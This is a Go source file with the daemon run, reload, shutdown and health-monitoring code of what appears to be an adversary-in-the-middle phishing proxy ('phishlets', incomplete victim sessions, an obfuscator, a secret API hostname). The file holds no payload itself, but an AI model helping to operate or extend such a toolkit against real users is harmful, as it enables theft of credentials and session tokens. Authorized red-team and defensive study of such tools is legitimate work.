package daemon

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
)

// Run starts the proxy and blocks until the context is cancelled or the proxy
// errors out. SIGHUP triggers a live config reload without stopping the proxy.
func (d *Daemon) Run(ctx context.Context) {
	go d.healthLoop(ctx)

	proxyErr := make(chan error, 1)
	go func() {
		proxyErr <- d.proxy.Start(ctx, fmt.Sprintf(":%d", d.cfg.HTTPSPort))
	}()

	sighup := make(chan os.Signal, 1)
	signal.Notify(sighup, syscall.SIGHUP)
	defer signal.Stop(sighup)

	for {
		select {
		case <-ctx.Done():
			return
		case err := <-proxyErr:
			if err != nil {
				d.logger.Error("proxy error", "error", err)
			}
			return
		case <-sighup:
			d.logger.Info("SIGHUP received — reloading config")
			if err := d.Reload(); err != nil {
				d.logger.Error("config reload failed", "error", err)
			}
		}
	}
}

// Reload re-reads the config file and applies live-reloadable settings.
// Settings that require a restart are logged as warnings and skipped.
func (d *Daemon) Reload() error {
	newCfg, err := loadConfig(d.configPath)
	if err != nil {
		return fmt.Errorf("reading config: %w", err)
	}

	// Settings that require restart — warn and skip.
	if newCfg.HTTPSPort != d.cfg.HTTPSPort {
		d.logger.Warn("https_port change requires restart")
	}
	if newCfg.DNSPort != d.cfg.DNSPort {
		d.logger.Warn("dns_port change requires restart")
	}
	if newCfg.API.SecretHostname != d.cfg.API.SecretHostname {
		d.logger.Warn("api.secret_hostname change requires restart")
	}

	d.cfg = newCfg
	d.logger.Info("config reloaded")
	return nil
}

// Shutdown tears down all subsystems in reverse dependency order.
// Called after Run returns.
func (d *Daemon) Shutdown() {
	d.logger.Info("shutting down")

	if d.phishletReloadSub != nil {
		d.bus.Unsubscribe(aitm.EventPhishletReloaded, d.phishletReloadSub)
	}

	if d.watcher != nil {
		if err := d.watcher.Close(); err != nil {
			d.logger.Error("watcher close error", "error", err)
		}
	}

	d.logger.Info("closing store")
	if err := d.db.Close(); err != nil {
		d.logger.Error("store close error", "error", err)
	}

	if d.obfuscator != nil {
		if err := d.obfuscator.Shutdown(context.Background()); err != nil {
			d.logger.Error("obfuscator shutdown error", "error", err)
		}
	}

	d.logger.Info("shutdown complete")
}

func (d *Daemon) healthLoop(ctx context.Context) {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			configs, _ := d.phishletSvc.ListDeployments()
			openSessions, _ := d.sessionSvc.Count(aitm.SessionFilter{IncompleteOnly: true})
			activePhishlets := 0
			for _, pcfg := range configs {
				if pcfg.Enabled {
					activePhishlets++
				}
			}
			d.logger.Debug("health",
				"goroutines", runtime.NumGoroutine(),
				"active_phishlets", activePhishlets,
				"open_sessions", openSessions,
				"heap_mb", heapMB(),
			)
		}
	}
}

func heapMB() uint64 {
	var ms runtime.MemStats
	runtime.ReadMemStats(&ms)
	return ms.HeapInuse / 1024 / 1024
}
